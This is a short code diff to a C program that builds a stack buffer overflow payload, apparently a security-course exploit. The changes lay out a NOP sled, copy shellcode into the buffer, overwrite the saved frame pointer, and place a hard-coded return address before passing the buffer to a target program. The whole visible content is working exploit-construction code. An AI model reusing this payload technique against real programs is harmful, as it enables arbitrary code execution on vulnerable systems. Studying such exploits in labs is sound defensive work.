@@ -12,11 +12,10 @@ int main(void) {
   char *env[1];
   char buf[169];
 
-  int shell_len = strlen(shellcode);
-
-  memset(buf, NOP, 160 - shell_len);
-  memcpy(buf + 160 - shell_len, shellcode, shell_len);
-  strcpy(buf + 164, "\x38\xfd\xff\xbf");
+  memset(buf, NOP, sizeof(buf));
+  strcpy(buf + 160 - strlen(shellcode), shellcode);
+  strcpy(buf + 160, "\xff\xff\xff\xff"   // sfp, which we don't care
+                    "\x38\xfd\xff\xbf"); // ret
 
   args[0] = TARGET;
   args[1] = buf;
